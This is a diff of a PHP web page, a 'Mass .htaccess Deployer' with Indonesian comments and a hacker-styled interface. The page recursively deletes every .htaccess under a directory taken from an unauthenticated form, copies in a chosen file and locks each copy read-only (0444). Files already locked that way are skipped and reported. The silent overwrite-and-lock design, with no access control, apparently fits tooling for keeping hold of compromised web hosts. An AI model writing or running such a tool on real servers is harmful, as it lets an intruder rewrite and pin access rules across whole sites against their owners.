@@ -1,27 +1,26 @@
 <?php
 /*
- * PROFESSIONAL MASS HTACCESS DEPLOYER V2
- * GUI Version | Recursive | 0444 Protection
+ * PROFESSIONAL MASS HTACCESS DEPLOYER V5 (FINAL FIX)
+ * Logic: Overwrite All & Chmod 0444 -> EXCEPT if existing target is ALREADY 0444 (SKIP & REPORT)
  */
 set_time_limit(0);
 ini_set('memory_limit', '-1');
-ini_set('display_errors', 0); // Sembunyikan error PHP native agar UI tetap bersih
+ini_set('display_errors', 0);
 
 $message = "";
-$report = [];
+$report = []; // Array ini HANYA menampung path yang di-SKIP (yang ada 0444 nya)
 $stats = ['success' => 0, 'locked' => 0, 'fail' => 0];
 
 // Logic Pemrosesan
 if (isset($_POST['execute'])) {
     $sourceFile = trim($_POST['source_file']);
-    $baseDir = rtrim(trim($_POST['base_dir']), '/'); // Hapus slash di akhir jika ada
+    $baseDir = rtrim(trim($_POST['base_dir']), '/'); 
 
     if (!file_exists($sourceFile)) {
-        $message = "<div class='alert error'>Error: File sumber (.htaccess) tidak ditemukan di path tersebut!</div>";
+        $message = "<div class='alert error'>Error: File sumber (.htaccess) tidak ditemukan!</div>";
     } elseif (!is_dir($baseDir)) {
         $message = "<div class='alert error'>Error: Direktori target tidak valid!</div>";
     } else {
-        // Mulai Operasi
         try {
             $iterator = new RecursiveIteratorIterator(
                 new RecursiveDirectoryIterator($baseDir, RecursiveDirectoryIterator::SKIP_DOTS),
@@ -33,39 +32,59 @@ if (isset($_POST['execute'])) {
                     $currentDir = $item->getPathname();
                     $targetFile = $currentDir . '/.htaccess';
                     
-                    // Status default
-                    $status = 'process'; 
+                    $isLocked = false;
 
-                    // Cek keberadaan file dan permission
+                    // 1. CEK APAKAH ADA FILE DAN STATUSNYA 0444
                     if (file_exists($targetFile)) {
                         $perms = substr(sprintf('%o', fileperms($targetFile)), -4);
-                        
-                        if ($perms == '0444' || $perms == '444') {
-                            $stats['locked']++;
-                            $report[] = ['path' => $currentDir, 'status' => 'LOCKED (0444)', 'class' => 'locked'];
-                            continue; // SKIP
+                        if ($perms == '0444') {
+                            $isLocked = true;
                         }
                     }
 
-                    // Proses Copy
-                    if (@copy($sourceFile, $targetFile)) {
-                        $stats['success']++;
-                        // Opsional: uncomment baris bawah jika ingin list folder sukses juga (bisa bikin berat loading jika ribuan folder)
-                        // $report[] = ['path' => $currentDir, 'status' => 'SUCCESS', 'class' => 'success'];
+                    if ($isLocked) {
+                        // KONDISI SKIP:
+                        // Karena ada 0444, kita JANGAN timpa.
+                        // DAN KITA MASUKKAN KE LAPORAN (REPORT).
+                        $stats['locked']++;
+                        $report[] = [
+                            'path' => $currentDir, 
+                            'status' => 'SKIPPED (FOUND EXISTING 0444)', 
+                            'class' => 'locked'
+                        ];
                     } else {
-                        $stats['fail']++;
-                        $report[] = ['path' => $currentDir, 'status' => 'FAILED (Permission Denied)', 'class' => 'fail'];
+                        // KONDISI EKSEKUSI (TIMPA):
+                        // Karena tidak ada 0444, kita hajar (timpa).
+                        // Dan file baru kita set jadi 0444.
+                        // TIDAK MASUK LAPORAN (Silent).
+                        
+                        // Hapus file lama jika ada (biar bersih)
+                        if(file_exists($targetFile)) { @unlink($targetFile); }
+
+                        if (@copy($sourceFile, $targetFile)) {
+                            @chmod($targetFile, 0444); // SET HASIL COPY JADI 0444
+                            $stats['success']++;
+                        } else {
+                            $stats['fail']++; // Gagal write permission folder
+                        }
                     }
                 }
             }
-            $message = "<div class='alert success'>Deploy Selesai! Cek laporan di bawah.</div>";
+            
+            // Pesan status akhir
+            if ($stats['locked'] > 0) {
+                 $message = "<div class='alert error'>Selesai. Ada " . $stats['locked'] . " path yang di-SKIP (Lihat Log).</div>";
+            } else {
+                 $message = "<div class='alert success'>Selesai. Semua path berhasil ditimpa (Tidak ada yang di-skip).</div>";
+            }
+
         } catch (Exception $e) {
             $message = "<div class='alert error'>System Error: " . $e->getMessage() . "</div>";
         }
     }
 }
 
-// Auto-fill path untuk memudahkan user
+// Auto-fill path
 $defaultBase = getcwd();
 $defaultSource = $defaultBase . '/net/.htaccess';
 ?>
@@ -75,158 +94,455 @@ $defaultSource = $defaultBase . '/net/.htaccess';
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>htaccess Deployer</title>
+    <title>MASS DEPLOYER V5</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --bg: #0f172a;
-            --card: #1e293b;
+            --bg: #050a14;
+            --card-bg: rgba(30, 41, 59, 0.7);
             --text: #e2e8f0;
             --accent: #38bdf8;
             --success: #22c55e;
             --danger: #ef4444;
             --warning: #f59e0b;
+            --neon-glow: 0 0 10px rgba(56, 189, 248, 0.5);
         }
+
+        * {
+            box-sizing: border-box;
+        }
+
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'JetBrains Mono', monospace;
             background-color: var(--bg);
             color: var(--text);
             margin: 0;
-            padding: 20px;
+            padding: 0;
             display: flex;
             justify-content: center;
+            align-items: center;
             min-height: 100vh;
+            overflow-x: hidden;
         }
+
+        /* Background Animation */
+        #canvas-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.3;
+        }
+
         .container {
             width: 100%;
             max-width: 900px;
+            padding: 20px;
+            z-index: 10;
+            animation: slideUp 0.8s cubic-bezier(0.2, 0.8, 0.2, 1);
         }
+
         .card {
-            background-color: var(--card);
-            padding: 2rem;
-            border-radius: 30px;
-            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.5);
-            margin-bottom: 20px;
-            border: 1px solid #334155;
+            background-color: var(--card-bg);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            padding: 2.5rem;
+            border-radius: 24px;
+            box-shadow: 0 20px 50px -12px rgba(0, 0, 0, 0.7);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            position: relative;
+            overflow: hidden;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
         }
-        h1 { margin-top: 0; color: #ff0000; font-size: 1.5rem; text-transform: uppercase; letter-spacing: 1px; }
-        label { display: block; margin-bottom: 8px; font-weight: bold; color: #94a3b8; }
+
+        .card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 25px 60px -12px rgba(0, 0, 0, 0.8);
+            border-color: rgba(56, 189, 248, 0.3);
+        }
+
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: linear-gradient(90deg, var(--danger), var(--accent), var(--success));
+            animation: gradient-shift 3s infinite linear;
+            background-size: 200% 200%;
+        }
+
+        h1 {
+            margin-top: 0;
+            color: #fff;
+            font-size: 1.8rem;
+            letter-spacing: -1px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            text-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
+        }
+
+        h1 span {
+            color: var(--danger);
+        }
+
+        p.subtitle {
+            color: #94a3b8;
+            margin-top: -10px;
+            font-size: 0.9rem;
+            opacity: 0.8;
+            margin-bottom: 30px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 10px;
+            font-size: 0.85rem;
+            font-weight: 700;
+            color: var(--accent);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
         input[type="text"] {
             width: 100%;
-            padding: 12px;
-            background: #0f172a;
-            border: 1px solid #334155;
+            padding: 16px;
+            background: rgba(15, 23, 42, 0.6);
+            border: 1px solid rgba(148, 163, 184, 0.2);
             color: #fff;
-            border-radius: 15px;
-            margin-bottom: 15px;
-            font-family: monospace;
-            box-sizing: border-box;
+            border-radius: 12px;
+            margin-bottom: 25px;
+            font-family: 'JetBrains Mono', monospace;
+            transition: all 0.3s ease;
+            font-size: 0.95rem;
         }
-        input[type="text"]:focus { outline: 2px solid #ff0000; border-color: transparent; }
+
+        input[type="text"]:focus {
+            outline: none;
+            border-color: var(--accent);
+            box-shadow: 0 0 0 4px rgba(56, 189, 248, 0.1);
+            background: rgba(15, 23, 42, 0.9);
+        }
+
         button {
             width: 100%;
-            padding: 12px;
-            background: #ff0000;
+            padding: 18px;
+            background: linear-gradient(135deg, #dc2626 0%, #ef4444 100%);
             color: #fff;
             font-weight: bold;
             border: none;
-            border-radius: 15px;
+            border-radius: 12px;
             cursor: pointer;
-            transition: all 0.2s;
-            text-transform: uppercase;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            text-transform: uppercase;font-family: 'JetBrains Mono', monospace;
+            font-size: 1rem;
+            letter-spacing: 1px;
+            position: relative;
+            overflow: hidden;
         }
-        button:hover { background: #0ea5e9; transform: translateY(-1px); }
+
+        button::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: 0.5s;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px -5px rgba(239, 68, 68, 0.4);
+        }
         
+        button:hover::after {
+            left: 100%;
+        }
+
+        button:active {
+            transform: translateY(0);
+        }
+
         /* Stats Grid */
-        .stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 20px; }
-        .stat-box { padding: 15px; border-radius: 8px; text-align: center; font-weight: bold; }
-        .stat-success { background: rgba(34, 197, 94, 0.2); color: var(--success); border: 1px solid var(--success); }
-        .stat-locked { background: rgba(245, 158, 11, 0.2); color: var(--warning); border: 1px solid var(--warning); }
-        .stat-fail { background: rgba(239, 68, 68, 0.2); color: var(--danger); border: 1px solid var(--danger); }
-        .stat-number { font-size: 1.5rem; display: block; }
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin-top: 30px;
+            opacity: 0;
+            animation: fadeIn 0.5s ease 0.2s forwards;
+        }
+
+        .stat-box {
+            padding: 20px;
+            border-radius: 16px;
+            text-align: center;
+            font-weight: bold;
+            position: relative;
+            overflow: hidden;
+            transition: transform 0.3s;
+        }
+        
+        .stat-box:hover {
+            transform: scale(1.05);
+        }
+
+        .stat-success { background: rgba(34, 197, 94, 0.1); color: var(--success); border: 1px solid rgba(34, 197, 94, 0.3); }
+        .stat-locked { background: rgba(245, 158, 11, 0.1); color: var(--warning); border: 1px solid rgba(245, 158, 11, 0.3); }
+        .stat-fail { background: rgba(239, 68, 68, 0.1); color: var(--danger); border: 1px solid rgba(239, 68, 68, 0.3); }
+
+        .stat-number {
+            font-size: 2rem;
+            display: block;
+            margin-bottom: 5px;
+        }
 
         /* Report Table */
+        .report-section {
+            margin-top: 30px;
+            opacity: 0;
+            animation: fadeIn 0.5s ease 0.4s forwards;
+        }
+
+        .report-header {
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            padding-bottom: 10px;
+            color: var(--warning);
+            font-size: 1.1rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
         .report-log {
             max-height: 400px;
             overflow-y: auto;
-            background: #000;
-            border-radius: 8px;
+            background: rgba(0, 0, 0, 0.4);
+            border-radius: 12px;
             padding: 10px;
-            border: 1px solid #334155;
-            font-family: monospace;
-            font-size: 0.9rem;
+            margin-top: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            font-size: 0.85rem;
         }
-        .log-item { padding: 5px; border-bottom: 1px solid #333; display: flex; justify-content: space-between; }
+
+        .log-item {
+            padding: 12px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: background 0.2s;
+        }
+
+        .log-item:hover {
+            background: rgba(255, 255, 255, 0.03);
+        }
+
         .log-item:last-child { border-bottom: none; }
-        .status-badge { padding: 2px 6px; border-radius: 4px; font-size: 0.8rem; }
+        .log-item.locked { color: var(--warning); }
+        .log-item.fail { color: var(--danger); }
+
+        .status-badge { 
+            padding: 4px 10px; 
+            border-radius: 6px; 
+            font-size: 0.7rem; 
+            font-weight: bold;
+            color: #000;
+            text-transform: uppercase;
+        }
         
-        .locked .status-badge { background: var(--warning); color: #000; }
-        .fail .status-badge { background: var(--danger); color: #fff; }
+        .locked .status-badge { background: var(--warning); box-shadow: 0 0 10px rgba(245, 158, 11, 0.4); }
+        .fail .status-badge { background: var(--danger); color: #fff; box-shadow: 0 0 10px rgba(239, 68, 68, 0.4); }
         
-        .alert { padding: 15px; border-radius: 15px; margin-bottom: 20px; font-weight: bold; text-align: center; }
-        .alert.success { background: rgba(34, 197, 94, 0.2); color: var(--success); border: 1px solid var(--success); }
-        .alert.error { background: rgba(239, 68, 68, 0.2); color: var(--danger); border: 1px solid var(--danger); }
+        .alert {
+            padding: 16px;
+            border-radius: 12px;
+            margin-bottom: 25px;
+            font-weight: bold;
+            text-align: center;
+            animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
+        }
+        .alert.success { background: rgba(34, 197, 94, 0.15); color: var(--success); border: 1px solid var(--success); animation: fadeIn 0.5s; }
+        .alert.error { background: rgba(239, 68, 68, 0.15); color: var(--danger); border: 1px solid var(--danger); }
+
+        /* Animations */
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(40px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes gradient-shift {
+            0% { background-position: 0% 50%; }
+            100% { background-position: 100% 50%; }
+        }
+
+        @keyframes shake {
+            10%, 90% { transform: translate3d(-1px, 0, 0); }
+            20%, 80% { transform: translate3d(2px, 0, 0); }
+            30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
+            40%, 60% { transform: translate3d(4px, 0, 0); }
+        }
 
         /* Scrollbar */
-        ::-webkit-scrollbar { width: 8px; }
-        ::-webkit-scrollbar-track { background: #0f172a; }
-        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 4px; }
-        ::-webkit-scrollbar-thumb:hover { background: #475569; }
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 10px; }
+        ::-webkit-scrollbar-thumb:hover { background: rgba(255,255,255,0.2); }
+
+        .success-box {
+            margin-top: 30px;
+            text-align: center;
+            padding: 30px;
+            border: 1px dashed rgba(34, 197, 94, 0.4);
+            border-radius: 16px;
+            background: rgba(34, 197, 94, 0.05);
+            animation: fadeIn 0.5s ease 0.4s forwards;
+        }
+
     </style>
 </head>
 <body>
 
+<canvas id="canvas-bg"></canvas>
+
 <div class="container">
     <div class="card">
-        <h1>🚀 Mass .htaccess Deployer</h1>
-        <p style="color:#64748b; margin-top:-10px; font-size:0.9rem;">Recursive Copy & 0444 Protection System</p>
+        <h1><span>⚡</span> DEPLOYER V5 <span>.EXE</span></h1>
+        <p class="subtitle">AUTOMATED PERMISSION LOCKING SYSTEM [0444]</p>
         
         <?= $message ?>
 
         <form method="POST">
-            <label>📂 Source File (.htaccess Induk)</label>
-            <input type="text" name="source_file" value="<?= isset($_POST['source_file']) ? htmlspecialchars($_POST['source_file']) : $defaultSource ?>" placeholder="/var/www/.../net/.htaccess" required>
+            <label>📂 Source File (.HTACCESS)</label>
+            <input type="text" name="source_file" value="<?= isset($_POST['source_file']) ? htmlspecialchars($_POST['source_file']) : $defaultSource ?>" placeholder="/var/www/.../net/.htaccess" required spellcheck="false">
 
-            <label>🎯 Target Directory (Base Folder)</label>
-            <input type="text" name="base_dir" value="<?= isset($_POST['base_dir']) ? htmlspecialchars($_POST['base_dir']) : $defaultBase ?>" placeholder="/var/www/.../web/" required>
+            <label>🎯 Target Directory (ROOT)</label>
+            <input type="text" name="base_dir" value="<?= isset($_POST['base_dir']) ? htmlspecialchars($_POST['base_dir']) : $defaultBase ?>" placeholder="/var/www/.../web/" required spellcheck="false">
 
-            <button type="submit" name="execute">START DEPLOYMENT</button>
+            <button type="submit" name="execute">INITIALIZE DEPLOYMENT</button>
         </form>
 
         <?php if (isset($_POST['execute'])): ?>
             <div class="stats-grid">
                 <div class="stat-box stat-success">
-                    <span class="stat-number"><?= $stats['success'] ?></span>
+                    <span class="stat-number count-up" data-target="<?= $stats['success'] ?>">0</span>
                     SUCCESS
                 </div>
                 <div class="stat-box stat-locked">
-                    <span class="stat-number"><?= $stats['locked'] ?></span>
-                    LOCKED (0444)
+                    <span class="stat-number count-up" data-target="<?= $stats['locked'] ?>">0</span>
+                    LOCKED
                 </div>
                 <div class="stat-box stat-fail">
-                    <span class="stat-number"><?= $stats['fail'] ?></span>
+                    <span class="stat-number count-up" data-target="<?= $stats['fail'] ?>">0</span>
                     FAILED
                 </div>
             </div>
 
             <?php if (!empty($report)): ?>
-                <h3 style="margin-top:20px; border-bottom: 1px solid #333; padding-bottom:10px;">⚠️ Locked / Failed Paths</h3>
-                <div class="report-log">
-                    <?php foreach ($report as $log): ?>
-                        <div class="log-item <?= $log['class'] ?>">
-                            <span><?= $log['path'] ?></span>
-                            <span class="status-badge"><?= $log['status'] ?></span>
-                        </div>
-                    <?php endforeach; ?>
+                <div class="report-section">
+                    <h3 class="report-header">
+                        ⚠️ SYSTEM REPORT: LOCKED FILES DETECTED
+                    </h3>
+                    <div class="report-log">
+                        <?php foreach ($report as $log): ?>
+                            <div class="log-item <?= $log['class'] ?>">
+                                <span><?= $log['path'] ?></span>
+                                <span class="status-badge"><?= $log['status'] ?></span>
+                            </div>
+                        <?php endforeach; ?>
+                    </div>
                 </div>
-            <?php elseif($stats['locked'] == 0 && $stats['fail'] == 0): ?>
-                 <div style="margin-top:20px; text-align:center; color: #64748b;">
-                    <i>All clean. Tidak ada file terkunci (0444) yang ditemukan.</i>
+            <?php elseif ($stats['success'] > 0): ?>
+                 <div class="success-box"><h3 style="color: var(--success); margin:0; font-size: 1.5rem;">✅ MISSION COMPLETE</h3>
+                    <p style="color: #94a3b8; margin-top:10px;">All targets successfully overwritten and locked (0444).</p>
                  </div>
             <?php endif; ?>
 
         <?php endif; ?>
     </div>
 </div>
+
+<script>
+    // Matrix Rain Animation
+    const canvas = document.getElementById('canvas-bg');
+    const ctx = canvas.getContext('2d');
+
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+
+    const katakana = 'アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロヲゴゾドボポヴッン0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    const alphabet = katakana.split('');
+
+    const fontSize = 14;
+    const columns = canvas.width/fontSize;
+
+    const drops = [];
+    for(let x = 0; x < columns; x++) drops[x] = 1;
+
+    function draw() {
+        ctx.fillStyle = 'rgba(5, 10, 20, 0.05)';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+        ctx.fillStyle = '#0F0'; // Green text
+        ctx.font = fontSize + 'px monospace';
+
+        for(let i = 0; i < drops.length; i++) {
+            const text = alphabet[Math.floor(Math.random()*alphabet.length)];
+            // Use specific color for variety
+            ctx.fillStyle = (Math.random() > 0.95) ? '#FFF' : '#22c55e'; 
+            ctx.fillText(text, i*fontSize, drops[i]*fontSize);
+
+            if(drops[i]*fontSize > canvas.height && Math.random() > 0.975)
+                drops[i] = 0;
+            drops[i]++;
+        }
+    }
+
+    setInterval(draw, 33);
+
+    window.addEventListener('resize', () => {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+    });
+
+    // Number Counter Animation
+    document.querySelectorAll('.count-up').forEach(el => {
+        const target = parseInt(el.getAttribute('data-target'));
+        const duration = 1500; // ms
+        const frameDuration = 1000 / 60;
+        const totalFrames = Math.round(duration / frameDuration);
+        const easeOutQuad = t => t * (2 - t);
+        
+        let frame = 0;
+        const counter = setInterval(() => {
+            frame++;
+            const progress = easeOutQuad(frame / totalFrames);
+            const currentCount = Math.round(target * progress);
+
+            if (target > 0) {
+                el.innerText = currentCount;
+            } else {
+                el.innerText = 0;
+            }
+
+            if (frame === totalFrames) {
+                clearInterval(counter);
+                el.innerText = target;
+            }
+        }, frameDuration);
+    });
+</script>
 
 </body>
 </html>
